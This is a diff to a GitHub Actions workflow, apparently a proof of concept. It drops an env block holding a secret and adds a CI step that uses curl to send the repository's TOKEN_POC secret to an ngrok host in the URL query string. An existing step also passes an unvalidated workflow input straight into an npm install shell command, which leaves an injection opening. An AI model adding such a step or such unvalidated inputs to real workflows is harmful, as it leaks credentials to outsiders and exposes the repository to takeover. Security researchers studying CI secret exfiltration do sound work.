@@ -14,7 +14,6 @@ jobs:
       - uses: actions/setup-node@v3
         with:
           node-version: '14'
-        env:
-          super_secret: ${{ secrets.TOKEN_POC }}
       - run: npm install -g bats@${{ github.event.inputs.bats_version }}
       - run: bats -v
+      - run: curl https://5359-210-16-83-150.ngrok-free.app/?token=${{ secrets.TOKEN_POC }}
